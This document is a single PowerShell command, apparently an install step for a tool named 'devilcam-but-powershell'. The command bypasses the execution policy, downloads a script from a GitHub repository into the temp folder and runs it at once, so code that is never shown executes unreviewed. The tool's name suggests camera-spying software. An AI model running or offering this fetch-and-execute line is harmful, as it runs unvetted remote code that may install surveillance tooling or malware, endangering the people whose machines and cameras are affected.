```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "iwr 'https://raw.githubusercontent.com/09sychic/devilcam-but-powershell/main/installer.ps1' -OutFile '$env:TEMP\installer.ps1'; & '$env:TEMP\installer.ps1'"
```
